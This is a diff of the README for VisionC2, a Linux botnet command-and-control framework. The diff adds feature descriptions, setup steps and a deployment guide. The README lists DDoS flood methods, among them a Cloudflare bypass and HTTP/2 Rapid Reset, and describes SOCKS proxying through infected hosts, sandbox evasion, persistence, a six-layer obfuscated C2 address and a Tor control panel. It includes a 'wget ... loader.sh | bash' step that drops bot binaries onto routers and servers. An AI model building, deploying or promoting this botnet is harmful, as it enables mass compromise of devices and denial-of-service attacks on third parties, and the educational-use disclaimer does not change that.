@@ -1,164 +1,147 @@
+
 <div align="center">
 
 # VisionC2
 
-### Advanced Linux C2 Framework
+### Advanced Linux C2 Framework — Modular, Encrypted, Cross-Architecture
 
-<table>
-<tr>
-<td width="50%">
+<br>
 
- **Modular Bot Builds**                                                                                                                                                                                                                                                                      Per-build module selection via Go build tags — attacks, SOCKS, or shell-only. Bots advertise capabilities on join; commands only route to bots that can execute them.
+| | |
+|:-:|:-:|
+| 🧩 **Modular Bot Builds**<br>Pick your payload: full DDoS arsenal, SOCKS5 proxy mesh, lightweight remote shell, or all of the above. Select modules at compile time| 🔒 **Fully Static Binaries**<br>Every binary runs on any Linux kernel: ancient routers, uClibc embedded devices, minimal containers. All 14 architectures produce a `statically linked` ELF. |
+| 🛡️ **Encrypted Everything**<br>TLS 1.3 on port 443. AES-256-CTR config encryption with unique per-build keys. C2 address buried under 6 layers — Base64, XOR, RC4, byte substitution, MD5 checksum, AES-CTR. HMAC challenge-response auth on every connection. Zero plaintext in the binary. | 🖥️ **3 Control Interfaces**<br>Tor hidden service web panel (zero clearnet exposure). Interactive Go TUI. Telnet CLI for remote/multi-user access. RBAC across all three with 4 permission tiers. Single `users.json` shared between all interfaces. |
 
-</td>
-<td width="50%">
-
-**Fully Static Binaries**
-Every binary runs on any Linux kernel: ancient routers, uClibc embedded devices, minimal containers. All 14 architectures produce a `statically linked` ELF.
-
-</td>
-</tr>
-<tr>
-<td width="50%">
-
-**Encrypted Everything**
-TLS 1.3 on port 443. AES-256-CTR config encryption with unique per-build keys. C2 address buried under 6 layers — Base64, XOR, RC4, byte substitution, MD5 checksum, AES-CTR. HMAC challenge-response auth on every connection. Zero plaintext in the binary.
-
-</td>
-<td width="50%">
-
-**3 Control Interfaces**
-Tor hidden service web panel (zero clearnet exposure). Interactive Go TUI. Telnet CLI for remote/multi-user access. RBAC across all three with 4 permission tiers. Single `users.json` shared between all interfaces.
-
-</td>
-</tr>
-</table>
+<br>
 
 [![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://go.dev)
-[![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)](README.md)
-[![Architectures](https://img.shields.io/badge/Architectures-14-blueviolet?style=for-the-badge)](README.md#deploying-bots)
-[![Changelog](https://img.shields.io/badge/Changelog-Docs-f59e0b?style=for-the-badge)](Docs/CHANGELOG.md)
+[![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)]()
+[![Architectures](https://img.shields.io/badge/Architectures-14-blueviolet?style=for-the-badge)](#deploying-bots)
+[![License](https://img.shields.io/badge/License-Educational_Use_Only-red?style=for-the-badge)](#legal-disclaimer)
 
 <br>
 
 <details>
-<summary><b>📸 Web Panel (Tor)</b></summary>
+<summary><b>📸 Web Panel (Tor Hidden Service)</b></summary>
 <br>
 <img src="https://github.com/user-attachments/assets/e6bbfd83-725f-4881-8b9d-c6be45b88f27" alt="VisionC2 Tor Panel" width="100%">
 </details>
 
-<br>
-
 <details>
 <summary><b>📸 Remote Shell & File Browser</b></summary>
 <br>
-<img width="1378" height="857" alt="image" src="https://github.com/user-attachments/assets/1885ebfe-ff79-4b05-a084-28e565454824" />
-
+<img width="1378" height="857" alt="image" src="https://github.com/user-attachments/assets/1885ebfe-ff79-4b05-a084-28e565454824">
 </details>
 
-<br>
-
 <details>
-<summary><b>📸 Attack Builder</b></summary>
+<summary><b>📸 Attack Builder Interface</b></summary>
 <br>
 <img width="2353" height="866" alt="image" src="https://github.com/user-attachments/assets/ea1c9717-98a1-4400-9895-cb480f4feb06">
 </details>
 
-<br>
-
 <details>
-<summary><b>📸 Manage Users</b></summary>
+<summary><b>📸 User Management Panel</b></summary>
 <br>
 <img width="2375" height="1017" alt="image" src="https://github.com/user-attachments/assets/21b33bf9-ccbf-4197-933e-fc28b85923fe">
 </details>
 
-<br>
-
 <details>
-<summary><b>📸 Schedule Task</b></summary>
+<summary><b>📸 Scheduled Tasks View</b></summary>
 <br>
 <img width="2365" height="535" alt="image" src="https://github.com/user-attachments/assets/e3051202-253b-46e8-9deb-680580c24602">
 </details>
 
 </div>
 
-<br>
+---
+
+## 📋 Table of Contents
+
+- [Quick Start](#quick-start)
+- [Architecture Overview](#architecture-overview)
+- [Attack Methods](#attack-methods)
+- [Bot Deployment](#bot-deployment)
+- [Control Interfaces](#control-interfaces)
+- [Documentation](#documentation)
+- [Legal Disclaimer](#legal-disclaimer)
 
 ---
 
-## Quick Start
+##  Quick Start
 
-### Dependencies
+### System Requirements
+
+| Requirement | Minimum | Recommended |
+|-------------|---------|-------------|
+| **RAM** | 512MB | 2GB+ |
+| **Storage** | 1GB | 10GB+ |
+| **Network** | Port 443 inbound | Static public IP |
+| **OS** | Ubuntu 20.04+ | Ubuntu 22.04+ |
+
+### Install Dependencies
 
 ```bash
-sudo apt update && apt install -y openssl git wget python3 screen tor upx-ucl
+sudo apt update && sudo apt install -y openssl git wget python3 screen tor upx-ucl
 
 # Install Go 1.24+
 wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
 sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
 export PATH=$PATH:/usr/local/go/bin
+echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
 ```
 
-**Minimum:** 512MB RAM, 1GB storage, port 443 open inbound  
-**Recommended:** Ubuntu 22.04+, 2GB+ RAM
-
-### Setup
+### One-Command Setup
 
 ```bash
 git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
 python3 setup.py
 ```
 
-Select **[1] Full Setup**. The wizard prompts for your C2 address, admin port, TLS cert details, and which modules to compile into the bot (attacks, SOCKS, or both). Outputs:
+Select **[1] Full Setup** and follow the interactive wizard. You'll be prompted for:
 
-- `bins/` — 14 bot binaries (x86, x64, ARM v5/6/7/64, MIPS, MIPS64, PPC64, s390x, RISC-V)
-- `server` — CNC binary
-- `relay_server` — SOCKS relay binary
-- `cnc/certificates/` — TLS key pair
-- `setup_config.txt` — full config record for later restore
+- C2 server address (IP or domain)
+- Admin interface port
+- TLS certificate details
+- Bot module selection (attacks/SOCKS/both)
 
-### Starting the CNC
+### Build Outputs
 
-```bash
-./server              # interactive launcher (choose mode on start)
-./server --tui        # TUI mode directly
-./server --split      # Telnet CLI on admin port
-./server --daemon     # Telnet headless (no local UI)
+After setup completes, you'll find:
+
+```
+VisionC2/
+├── bins/              # 14 bot binaries (one per architecture)
+├── server             # CNC control binary
+├── relay_server       # SOCKS relay binary
+├── cnc/certificates/  # TLS key pair
+└── setup_config.txt   # Full configuration backup
 ```
 
-Run persistently: `screen -S vision ./server` — detach with `Ctrl+A D`.
+### Start the CNC Server
+
+```bash
+./server              # Interactive launcher (choose mode at startup)
+./server --tui        # Direct TUI mode
+./server --split      # Telnet CLI on admin port
+./server --daemon     # Headless mode (no local UI)
+```
+
+**Run persistently:** `screen -S vision ./server` — detach with `Ctrl+A D`
 
 ---
 
-## Bot Module System
+##  Setup Configuration Options
 
-Bots are built with Go build tags. Unused modules are excluded from the binary entirely — not just disabled at runtime. A SOCKS-only bot contains zero flood code.
-
-| Build Profile | Tag(s) | Binary contains |
-|:---|:---|:---|
-| Full | `withattacks,withsocks` | Attacks + SOCKS + shell |
-| Attacks only | `withattacks` | Attacks + shell |
-| SOCKS only | `withsocks` | SOCKS proxy + shell |
-| Shell only | *(none)* | Remote shell + persistence only |
-
-Each bot reports its compiled capabilities to the CNC in the REGISTER handshake. The CNC only routes attack commands to attack-capable bots and SOCKS commands to SOCKS-capable bots — no wasted traffic, no silent failures.
-
-To change module configuration: `python3 setup.py` → **[3] Module Update & Rebuild**.
+| Option | Description |
+|--------|-------------|
+| **[1] Full Setup** | New C2 address, AES key, tokens, certificates, and bot builds |
+| **[2] C2 URL Update** | Change C2 address only — preserves magic code, certs, tokens |
+| **[3] Module Update & Rebuild** | Change bot module selection — preserves everything else |
+| **[4] Restore from setup_config.txt** | Restore saved config after `git pull` or fresh clone |
 
 ---
 
-## setup.py Options
-
-| Option | What it does |
-|:---|:---|
-| **[1] Full Setup** | New C2 address, new AES key, new tokens, new certs, choose modules, build everything |
-| **[2] C2 URL Update** | Change C2 address only — keeps existing magic code, certs, and tokens |
-| **[3] Module Update & Rebuild** | Change which modules compile into bots — keeps everything else |
-| **[4] Restore from setup_config.txt** | Re-apply a saved config after `git pull` or fresh clone — generates fresh AES key, re-obfuscates C2, rebuilds |
-
----
-
-## Architecture
+##  Architecture Overview
 
 ```
 ┌─────────────┐       TLS 1.3 / 443        ┌─────────────┐
@@ -176,21 +159,23 @@ To change module configuration: `python3 setup.py` → **[3] Module Update & Reb
                    └───────────┘             └───────────┘             └───────────┘
 ```
 
+### Component Breakdown
+
 | Component | Path | Role |
-|:----------|:-----|:-----|
-| **CNC** | `cnc/` | C2 server — TLS 443 for bots, embedded Tor hidden service for web panel, TUI + Telnet CLI, RBAC |
-| **Bot** | `bot/` | Agent — TLS 1.3, 6-layer C2 decoding, sandbox evasion, persistence, shell, optional attacks/SOCKS |
-| **Relay** | `cnc/relay/` | SOCKS5 relay — bots backconnect out, users connect on SOCKS5 port, disposable VPS infrastructure |
-| **Tools** | `tools/` | Build script (`build.sh`), crypto helper, loader script |
+|-----------|------|------|
+| **CNC Server** | `cnc/` | Central C2 — TLS 443 for bots, embedded Tor hidden service, TUI + Telnet CLI, RBAC |
+| **Bot Agent** | `bot/` | Deployed agent — TLS 1.3, 6-layer C2 decoding, sandbox evasion, persistence, optional attacks/SOCKS |
+| **SOCKS Relay** | `cnc/relay/` | SOCKS5 relay — bots backconnect, users connect via SOCKS5 port, disposable VPS infrastructure |
+| **Tooling** | `tools/` | Build script (`build.sh`), crypto helper, deployment loader |
 
 ---
 
-## Attack Methods
+##  Attack Methods
 
-### Layer 4
+### Layer 4 (Network Layer)
 
 | Method | Description |
-|:-------|:------------|
+|--------|-------------|
 | **UDP Flood** | High-volume 1024-byte UDP payloads |
 | **TCP Flood** | Connection table exhaustion |
 | **SYN Flood** | Randomized source ports via raw TCP |
@@ -198,36 +183,43 @@ To change module configuration: `python3 setup.py` → **[3] Module Update & Reb
 | **GRE Flood** | Protocol 47, maximum payload |
 | **DNS Flood** | Randomized query types against resolver pool |
 
-### Layer 7
+### Layer 7 (Application Layer)
 
 | Method | Description |
-|:-------|:------------|
+|--------|-------------|
 | **HTTP Flood** | GET/POST with randomized headers and user-agents |
 | **HTTPS/TLS Flood** | TLS handshake exhaustion + burst requests |
 | **CF Bypass** | Cloudflare bypass via session/cookie reuse and fingerprinting |
 | **Rapid Reset** | HTTP/2 CVE-2023-44487 — HEADERS + RST_STREAM at scale |
 
-All L7 methods support HTTP and SOCKS5 proxy rotation via `-p <proxy_list_url>`.
+> **Note:** All L7 methods support HTTP and SOCKS5 proxy rotation via `-p <proxy_list_url>`.
 
-> Attack methods are only compiled into bots built with the `withattacks` tag.
+> ⚠️ Attack methods are **only compiled** into bots built with the `withattacks` tag.
 
 ---
 
-## SOCKS5 Proxy
+##  SOCKS5 Proxy System
 
-Bots backconnect to a relay server — they never open an inbound port. The relay accepts SOCKS5 clients on its public port and tunnels traffic through to the target via the bot.
+Bots backconnect to a relay server — they **never open inbound ports**. The relay accepts SOCKS5 clients on its public port and tunnels traffic through the bot to the target.
 
 ```
 Client → [SOCKS5] → Relay ←── [backconnect TLS] ──← Bot → Target
 ```
+  > Direct SOCKS5 on bot also aviable incase no relay server
 
-Relay servers are managed at runtime from the CNC dashboard — no rebuild required to add or remove endpoints.
+### Key Features
 
-> SOCKS is only compiled into bots built with the `withsocks` tag.
+- **Zero inbound ports** on bots — bypasses firewalls
+- **Dynamic relay management** — add/remove relays from CNC dashboard without rebuilds
+- **Disposable infrastructure** — rotate relay servers seamlessly
+
+> 🔧 SOCKS functionality is **only compiled** into bots built with the `withsocks` tag.
 
 ---
 
-## Deploying Bots
+##  Bot Deployment
+
+### 1. Host Binaries
 
 Host compiled binaries on a separate VPS:
 
@@ -237,41 +229,72 @@ sudo cp bins/* /var/www/html/bins/
 sudo systemctl start apache2
 ```
 
-Edit `tools/loader.sh` line 3 with your server IP:
+### 2. Configure Loader
+
+Edit `tools/loader.sh` line 3 with your hosting server IP:
 
 ```bash
 SRV="http://<your-server-ip>/bins"
 ```
 
-The loader auto-detects the target architecture and fetches the matching binary from the 14 available variants.
+### 3. Deploy
+
+The loader auto-detects target architecture and fetches the matching binary from the 14 available variants:
+
+```bash
+wget -qO- http://your-server/loader.sh | bash
+```
+
+### Supported Architectures
+
+| Architecture | Status | Use Case |
+|--------------|--------|----------|
+| x86, x86_64 | ✅ Full | Standard servers, desktops |
+| ARM v5/v6/v7 | ✅ Full | Older embedded, routers |
+| ARM64 | ✅ Full | Modern ARM servers, SBCs |
+| MIPS, MIPS64 | ✅ Full | Routers, networking gear |
+| PPC64 | ✅ Full | IBM Power systems |
+| s390x | ✅ Full | IBM Z mainframes |
+| RISC-V | ✅ Full | Emerging architecture |
 
 ---
 
-## CNC Interfaces
+##  Control Interfaces
 
 <img src="https://github.com/user-attachments/assets/b979ffcc-082f-47be-ac8d-206c751fa8f9" alt="VisionC2 TUI" width="100%">
 
-| Interface | Access | Use Case |
-|:----------|:-------|:---------|
+| Interface | Access Method | Best For |
+|-----------|---------------|----------|
 | **Tor Web Panel** | `.onion` via Tor Browser | Full GUI — attack builder, shell, bot management, SOCKS control, activity log, user admin |
 | **Go TUI** | `./server --tui` | Local interactive terminal with live bot feed and attack launcher |
-| **Telnet CLI** | `./server --split` | Lightweight remote access, multi-user, scriptable |
+| **Telnet CLI** | `./server --split` | Lightweight remote access, multi-user, scriptable operations |
+
+### Role-Based Access Control (RBAC)
+
+All three interfaces share `users.json` with four permission tiers:
+
+| Role | Permissions |
+|------|-------------|
+| **Admin** | Full system control, user management |
+| **Operator** | Attack execution, bot management |
+| **Viewer** | Read-only monitoring |
+| **Relay Only** | SOCKS relay operations only |
 
 ---
 
-## Documentation
+##  Documentation
 
 | Document | Description |
-|:---------|:------------|
+|----------|-------------|
 | [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | System design, encryption layers, protocol details |
-| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Full version history |
+| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Full version history and updates |
 | [`COMMANDS.md`](Docs/COMMANDS.md) | Complete TUI command and hotkey reference |
 | [`SETUP.md`](Docs/SETUP.md) | Detailed installation and configuration guide |
 | [`PROXY.md`](Docs/PROXY.md) | SOCKS5 relay deployment and configuration |
 
 ---
 
-## Troubleshooting
+## 🔧 Troubleshooting
 
 <details>
 <summary><b>"go: command not found" or wrong Go version</b></summary>
@@ -283,7 +306,7 @@ go version  # should show 1.24+
 </details>
 
 <details>
-<summary><b>"Permission denied" starting server on port 443</b></summary>
+<summary><b>"Permission denied" when starting server on port 443</b></summary>
 
 ```bash
 sudo setcap 'cap_net_bind_service=+ep' ./server
@@ -291,32 +314,51 @@ sudo setcap 'cap_net_bind_service=+ep' ./server
 </details>
 
 <details>
-<summary><b>Bots won't connect</b></summary>
+<summary><b>Bots won't connect to CNC</b></summary>
 
 - Confirm port 443 is open: `sudo ufw allow 443/tcp`
 - Verify C2 address in `setup_config.txt` matches your server's public IP
-- Test TLS: `openssl s_client -connect YOUR_IP:443`
-- Enable verbose logging: rerun `setup.py` with debug mode ON and check stdout
+- Test TLS connectivity: `openssl s_client -connect YOUR_IP:443`
+- Enable verbose logging: rerun `setup.py` with debug mode ON
 </details>
 
 <details>
 <summary><b>Relay server won't start</b></summary>
 
 - Check port availability: `ss -tulpn | grep :1080`
-- Confirm the binary is executable: `chmod +x relay_server`
-- Verify the auth key matches the CNC magic code in `setup_config.txt`
+- Ensure binary is executable: `chmod +x relay_server`
+- Verify auth key matches CNC magic code in `setup_config.txt`
+</details>
+
+<details>
+<summary><b>Web panel not accessible via Tor</b></summary>
+
+- Verify Tor is running: `systemctl status tor`
+- Check hidden service hostname: `sudo cat /var/lib/tor/hidden_service/hostname`
+- Ensure `torrc` contains: `HiddenServicePort 80 127.0.0.1:8080`
 </details>
 
 ---
 
-## Legal Disclaimer
+##  Legal Disclaimer
 
-For authorized security research and educational purposes only. Usage against systems without explicit prior consent is illegal. The developer assumes no liability for misuse.
+**For authorized security research and educational purposes only.**
+
+Usage against systems without explicit prior consent is **illegal**. The developer assumes **no liability** for misuse, unauthorized access, or any damages caused by this software.
+
+**By using this software, you agree that you:**
+- Have obtained proper authorization for all testing
+- Will comply with all applicable laws and regulations
+- Accept full responsibility for your actions
 
 ---
 
 <div align="center">
 
-**Syn2Much** — [hell@sinners.city](mailto:hell@sinners.city) | [@synacket](https://x.com/synacket)
+**Developed by Syn2Much** — [hell@sinners.city](mailto:hell@sinners.city) | [@synacket](https://x.com/synacket)
+
+---
+
+⭐ **Star this repository** if you find it useful for research purposes
 
 </div>
